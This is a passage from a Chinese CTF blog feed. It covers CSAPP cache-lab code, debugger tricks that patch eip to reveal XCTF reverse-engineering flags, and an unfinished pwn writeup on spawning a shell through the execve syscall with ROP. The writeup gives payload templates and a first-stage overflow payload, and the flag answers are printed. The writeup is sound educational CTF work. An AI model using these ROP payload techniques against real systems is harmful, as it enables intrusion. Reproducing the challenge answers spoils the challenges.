class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:E = atoi(optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:b = atoi(optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:<span class="built_in">strcpy</span>(filename, optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(help_mode == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;cat help_info&quot;</span>);<span class="comment">//&quot;help_info&quot; is a text file containing help information</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;The File is wrong!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S = (<span class="number">1</span> &lt;&lt; s); <span class="comment">// S equals to 2^s</span></span><br><span class="line">    cache = (cache_line**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line*) * S);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        cache[i] = (cache_line*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);<span class="comment">//Important! malloc each row of cache</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[i][j].valid_bit = <span class="number">0</span>;</span><br><span class="line">            cache[i][j].tag = cache[i][j].stamp = <span class="number">-1</span>;</span><br><span class="line">        &#125;<span class="comment">//initialization</span></span><br><span class="line">    <span class="keyword">while</span>(fgets(buffer,<span class="number">1000</span>,fp))<span class="comment">//get a whole line</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(buffer,<span class="string">&quot; %c %xu,%d&quot;</span>, &amp;type, &amp;address, &amp;temp);<span class="comment">//hexdecimal</span></span><br><span class="line">        <span class="keyword">switch</span>(type)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:update(address);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:update(address);<span class="comment">//just let it fall through, do twice</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:update(address);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        update_time();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="built_in">free</span>(cache[i]);<span class="comment">//free allocated space first</span></span><br><span class="line">    <span class="built_in">free</span>(cache);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    printSummary(number_hits, number_miss, number_eviction);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><p><img src="https://i.loli.net/2021/05/23/qTi9oVAtbpeRYnk.png" alt="Cachelab_PartA_1.png"></p><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>优化矩阵转置函数，使得cache miss尽可能少,不超过12个临时变量</p><h3 id="32-x-32"><a href="#32-x-32" class="headerlink" title="32 x 32"></a>32 x 32</h3><p>直接转置是肯定不行的，这都不用去试(实则败而归来)。众所周知，分块是一个很好用的算法</p><p>32位字节的数据，一个int4字节，每行/列有8个int，我们将其分块为8x8，进行处理</p><p>充分利用这些变量即可写出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(M == <span class="number">32</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i, j, k, v1, v2, v3, v4, v5, v6, v7, v8;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">8</span>)</span><br><span class="line">                <span class="keyword">for</span>(k = i; k &lt; (i + <span class="number">8</span>); ++k)</span><br><span class="line">                &#123;</span><br><span class="line">                    v1 = A[k][j];</span><br><span class="line">                    v2 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                    v3 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                    v4 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                    v5 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                    v6 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                    v7 = A[k][j+<span class="number">6</span>];            </span><br><span class="line">                    v8 = A[k][j+<span class="number">7</span>];</span><br><span class="line">                    B[j][k] = v1;</span><br><span class="line">                    B[j+<span class="number">1</span>][k] = v2;</span><br><span class="line">                    B[j+<span class="number">2</span>][k] = v3;</span><br><span class="line">                    B[j+<span class="number">3</span>][k] = v4;</span><br><span class="line">                    B[j+<span class="number">4</span>][k] = v5;</span><br><span class="line">                    B[j+<span class="number">5</span>][k] = v6;</span><br><span class="line">                    B[j+<span class="number">6</span>][k] = v7;</span><br><span class="line">                    B[j+<span class="number">7</span>][k] = v8;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个暂时先立个flag在这里，等之后会做了再做吧，后面的真的做的不太行了。。。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>动态调试工具的使用</title>
      <link href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>做了这么久的<code>pwn</code>之后又得兼顾一下<code>re</code>了哈哈哈。废话不多说，这周学了动态调试器的使用，并且轻松解出了那几道题目。</p><span id="more"></span><p><code>linux</code>下的动态调试器都知道，<code>gdb</code>永远的神，<code>windows</code>的动态调试器就比较各色了，<code>ollydbg</code>，<code>x32dbg</code>，<code>x64dbg</code>。这里我用的是后两个调试器，<code>ollydbg</code>听师傅们说是不更新了还是咋地也不知道，所以就用了x32和<code>x64dbg</code>，其实看了一下界面都差不多的。</p><p>动态调试注意的就是下断点，改值这一系列操作，让程序按照你想的执行。比如有一个函数就是直接输出<code>flag</code>，但是它直接又没有完全直接给你，那怎么办？我直接改<code>eip</code>去执行那个函数不就ok了？与<code>pwn</code>不一样，<code>pwn</code>我要通过漏洞去执行，这个的话文件控制权限和这台计算机的权限全部在我手上，它怎么运行我说的算，对不对？那么接下来看几道例题，这个不是说只有动调能做，但是会动调一定比不会的占优势，这是真的。</p><h2 id="xctf-game"><a href="#xctf-game" class="headerlink" title="xctf-game"></a><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5074&page=1">xctf-game</a></h2><p>下载文件并且根据它的描述可以看到是一个32位PE文件且是一个类似游戏的程序，逻辑很简单，输入序列然后通过它函数的判断就可以让程序输出<code>flag</code>。但是</p><p><img src="https://i.loli.net/2021/05/22/ufkspBM3bHW1VgN.png" alt="xctf_game_1.png"></p><p>这个函数不仅复杂，直接从这里破解可以但是比较难，要从外面实现又比较苛刻那么此时我们开启动调然后直接改eip执行这个函数。</p><p>x32dbg打开查看内存映射，发现textbss的基址是0x101000</p><p><img src="https://i.loli.net/2021/05/22/ezy8HXpV3x7nGq4.png" alt="xctf_game_2.png"></p><p>而在IDA里，此段的基址是<code>0x401000</code></p><p>很清楚了，他们之间偏移了<code>0x300000</code>的地址大小，在IDA里面的所有地址减去<code>0x300000</code>就可以得到在<code>x32dbg</code>里的对应地址。然后注意改<code>eip</code>遵循的原则应该是首先保证栈尽量平衡，并且修改的幅度尽量不大。根据这个原则以及<code>x32dbg</code>给我们程序一开始的断点。</p><p><img src="https://i.loli.net/2021/05/22/jwtIs7krZgyilfN.png" alt="xctf_game_3.png"></p><p>我们把栈顶的值修改成我们要跳转的地方，并且将<code>eip</code>向下调3个语句之后就能直接执行输出<code>flag</code>的语句而不用玩它设计的破游戏了。首先那个函数在IDA里面的地址是<code>0x457ab4</code>，那么在<code>x32dbg</code>里面这个地址就是<code>0x157ab4</code>。我们先把栈顶修改成这个，再把<code>eip</code>改成 <code>0x77661b78</code></p><p><img src="https://i.loli.net/2021/05/22/TicptYsPE9XRSl7.png" alt="xctf_game_4.png"></p><p>这里需要注意的是，由于我们破坏了它的栈，因此尽量避免去执行那些函数，遇到尽量跳过。</p><p><img src="https://i.loli.net/2021/05/22/wPlNWzIcQ7YsGxi.png" alt="xctf_game_5.png"></p><p>这里我们不选择执行<code>printf</code>函数，因为试过就知道由于之前破坏了栈帧会导致不可预估的错误发生，正确做法就是把<code>eip</code>改到<code>call</code>那个之后。</p><p>其实直接改<code>eip</code>也一样的，我那种只是改的其中一种方式。</p><p>然后下面还有一个<code>prinf</code>函数我们也选择不执行，在<code>printf</code>之前下个断点然后F9运行你就可以看到<code>flag</code>了。</p><p><img src="https://i.loli.net/2021/05/23/j9QYM6TUN3KeGuo.png" alt="xctf_game_6.png"></p><p>然后返回游戏一看，啥也没有，但是我已经知道了<code>flag</code>，hhh。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">flag:zsctf&#123;T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t&#125;</span><br></pre></td></tr></table></figure><h2 id="xctf-csaw2013reversing2"><a href="#xctf-csaw2013reversing2" class="headerlink" title="xctf-csaw2013reversing2"></a><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5081&page=1">xctf-csaw2013reversing2</a></h2><p>题目已经说了运行就可以拿<code>flag</code>，但是运行发现弹出来的窗口是乱码，IDA反汇编并且反编译之后检查<code>main</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line"></span><br><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ecx</span><br><span class="line">  CHAR *lpMem; // [esp+8h] [ebp-Ch]</span><br><span class="line">  HANDLE hHeap; // [esp+10h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  hHeap = HeapCreate(0x40000u, 0, 0);</span><br><span class="line">  lpMem = (CHAR *)HeapAlloc(hHeap, 8u, SourceSize + 1);</span><br><span class="line">  memcpy_s(lpMem, SourceSize, &amp;unk_409B10, SourceSize);</span><br><span class="line">  if ( !sub_40102A() &amp;&amp; !IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(0, lpMem + 1, &quot;Flag&quot;, 2u);</span><br><span class="line">    HeapFree(hHeap, 0, lpMem);</span><br><span class="line">    HeapDestroy(hHeap);</span><br><span class="line">    ExitProcess(0);</span><br><span class="line">  &#125;</span><br><span class="line">  __debugbreak();</span><br><span class="line">  sub_401000(v3 + 4, lpMem);</span><br><span class="line">  ExitProcess(0xFFFFFFFF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也太狗了，还会检测在不在调试器中，在的话我还索性不输出了？</p><p>跟进去<code>0x41000</code>函数去看发现有对<code>msgbox</code>输出的<code>flag</code>做了点手脚，那么就猜测可能这个部分是用来算正确的<code>flag</code>的，那么我们的顺序应该是先执行那个函数再输出<code>flag</code>才对。所以一开始我们改<code>eip</code>执行<code>0x41000</code>函数。</p><p>直接改了<code>eip</code>发现并不好使，那么我们就要再<code>main</code>函数里面直接调用<code>main</code>函数的代码了。发现还是不行之后，发现<code>int3</code>指令一直再阻挡，因此把这个指令<code>nop</code>掉。发现可以直接执行那个函数，执行完了之后发现还是要退出程序，那么我们就得寻找输出这个<code>flag</code>的函数，为什么我们不能像上面那个题那样，直接能看到变量的值？</p><p>问得好，我也不知道qwq，只能在线寻师傅解决这个疑问了。</p><p><img src="https://i.loli.net/2021/05/23/8C1M7fQv6yUPJwt.png" alt="xctf_csaw2013reversing2_1.png"></p><p>可以看到这边又两个调用messagebox函数，那么到底选择哪一个，回头看代码里就会发现咱们的messagebox传了四个参数，那么对比一下发现下面的messagebox才是传了四个参数的函数调用，那么我们把eip改到传参那边，运行执行跳出消息框得到flag</p><p><img src="https://i.loli.net/2021/05/23/uRpS1YtevmHThi8.png" alt="xctf_csaw2013reversing2_2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">flag：flag&#123;reversing_is_not_that_hard!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>系统调用</title>
      <link href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><code>today</code>新的知识又增长了，发现了<code>getshell</code>的另一种方式：<code>syscall</code>和<code>srop</code>。故事还要源于…(此处省略万字输出)</p><span id="more"></span><p>(note:本作者这次有点懒，没有写AT&amp;T汇编，而是一律用了intel汇编，请悉知)</p><p>可能是之前汇编基础不太好吧，竟没有发现<code>syscall</code>这么好用的指令，只要再把<code>/bin/sh</code>传参就能直接打开一个shell，真是妙蛙。但是在系统调用之前要做很多的事情，诸如各类参数传递，以64位的来说，我们要先知道我们要执行的函数系统调用号为59。我也是翻过<code>libc</code>库的，发现<code>system</code>函数实现里面有一段竟然是直接执行<code>execve(&quot;/bin/sh&quot;)</code></p><p><img src="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><p>实属意外了，这是在我有次反汇编<code>libc</code>库的时候发现的，我原来一直是只用<code>system</code>函数<code>getshell</code>的，没想到<code>system</code>内部是通过这样的系统调用来打开<code>shell</code>的。</p><p>那这得学啊，这是基础的基础啊。</p><p>这边给出一下64位Linux的各个系统调用号，这个在Linux的<code>/usr/include/asm/unistd.h </code>下有，我这里截取部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill 62</span></span><br></pre></td></tr></table></figure><p>emm，经过多方取证呢，发现打开shell不仅要给第一个参数传上<code>/bin/sh</code>字符串，第二第三个字符串都需要置零。64位呢前六个参数是依次给<code>rdi,rsi,rdx,rcx,r8,r9</code>这六个寄存器的。那么我们传参过程就比较艰难，注入代码首先肯定不现实，现在题目基本都是NX保护的挺到位的。所以要去程序里面寻找<code>gadget</code>，由于<code>pop %rbx</code>这个<code>gadget</code>巨难找，在实际应用要懂得变通，比如先给一个寄存器我想要的值然后再<code>mov</code>给<code>rdx</code>，有一样的效果。</p><p>由此就衍生出来一个<code>return to __libc_csu_init</code>简称<code>ret2csu</code>的方法来，其实这个我个人认为没有必要单独拿出来讲，因为就是因为这个特殊的函数基本蕴含了很多时候我们需要的<code>gadget</code>才会被如此传唱的，会了基本的<code>rop</code>攻击就行，<code>ret2csu</code>的原理跟这个就一模一样。</p><p>一般的payload就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fill_data+fake_rbp+(mov rax,<span class="number">59</span>)+pop_rdi+bin_sh_addr+pop_rsi+<span class="number">0</span>+pop_rdx+<span class="number">0</span></span><br></pre></td></tr></table></figure><p>这是一般的payload，如果找不到对应的gadget，可以自己适当变通。</p><h2 id="buuctf-ciscn-s-3"><a href="#buuctf-ciscn-s-3" class="headerlink" title="buuctf:ciscn_s_3"></a><a href="https://buuoj.cn/challenges#ciscn_2019_s_3">buuctf:ciscn_s_3</a></h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>64位无壳的elf程序，扔进<code>IDA</code>竟发现<code>plt</code>表只有可怜的两项，并且实用性也不大的那种。在一般的<code>ret2libc</code>中我们一般通过一个输出函数<code>(puts,write,printf)</code>来泄露地址，然而这里没有可以利用的输出函数，如果你想模仿下面输出一个<code>plt</code>表项内容也可以，不拦你，只是你费尽心思用系统调用的<code>puts</code>或者<code>write</code>为何不直接用<code>execve</code>直接<code>getshell</code>呢？所以我们就确定我们采用<code>syscall</code>的方式去<code>getshell</code>。</p><h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><p>这一个可以说很明显的一个栈溢出漏洞了，<code>read</code> <code>0x400</code>字节的数据，且缓冲区特别小。</p><h3 id="第一次溢出"><a href="#第一次溢出" class="headerlink" title="第一次溢出"></a>第一次溢出</h3><p>由于程序并未直接提供<code>/bin/sh</code>字符串，因此我们要靠自己，然后最后填上一个<code>main</code>实现二次溢出，第一次写<code>/bin/sh</code>，第二次执行<code>execve(&quot;/bin/sh&quot;)</code>。</p><hr><p>这里提出一点我自己的看法，我认为这个题目有点问题，vlun函数很可能存在栈不平衡的情况，理由有两点</p><p>1.程序正常执行(无溢出)无法正常结束</p><p>2.给<code>24</code>字节大小的数据可以直接覆盖<code>rip</code>，因为我的理解是缓冲区大小<code>16</code>字节再加上一个<code>rbp 8</code>字节应该<code>24</code>个字节才刚刚覆盖到<code>rbp</code>的位置，而无法覆盖返回地址的。</p><hr><p>而且由于我们要调用栈上的数据，且栈是动态的，我们无法准确得知我们写的<code>/bin/sh</code>字符串的所在位置，因此我们第一次溢出可谓是身负重担，不仅要提供<code>/bin/sh</code>字符串还要泄露栈的地址。由于程序只有下面的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br></pre></td></tr></table></figure><p>因此我们必须通过这个函数泄露点什么。</p><p>想想当时程序调用的栈帧是什么样的，什么内容是跟栈的地址有关的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">低地址↑</span><br><span class="line">buf in vlun</span><br><span class="line"></span><br><span class="line">rbp for main</span><br><span class="line">rip for main</span><br><span class="line">rbp for main&#x27;s father function</span><br><span class="line">rip for main&#x27;s father function</span><br><span class="line">高地址↓</span><br></pre></td></tr></table></figure><p>如此我们也可以清楚看到，首先main的rbp是肯定被我们覆盖了的(PS 虽然现在好像是没有的)，然后后面还有一个调用main函数的那个函数的rbp，那个可以确定栈的地址，能输出这个之后我们就可以开始算偏移了。</p><p>gdb调试算算rbp与它们之间的偏移，这里需要注意由于栈不平衡的原因，我们需要手动调一下rip让程序不要异常退出，然后我们调试到leave指令可以观察到此时的栈。</p><p><img src="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>在地址0x7fffffffde20的地方存了__libc_start_main函数的rbp=0x7fffffffdf28，那么计算一下偏移就是264，当前的rsp是main函数的rsp是vlun函数的rbp，所以我们泄露出来的这个地址与vlun函数的rbp偏移了264字节，然后再有16字节的缓冲区，如果我们再缓冲区开始写入<code>/bin/sh</code>字符串的话那么偏移就有280字节的大小。</p><p>然而这些应该是第二次溢出考虑的问题，这里只是分析一下泄露地址的可行性。</p><p>第一次的payload比较简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(main)</span><br></pre></td></tr></table></figure><p>然后接受准备接收rbp，但是在改rip的过程中发现这里还是有0x20个字节才能到rbp的，但是我能直接略过rbp覆盖rip就有点离谱，就不知道main的rbp是存在哪了，也许是存在rip后面了。这个我也不太能讲的清楚，希望有师傅明白的话能为我解答一下，感激不尽。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span><br><span 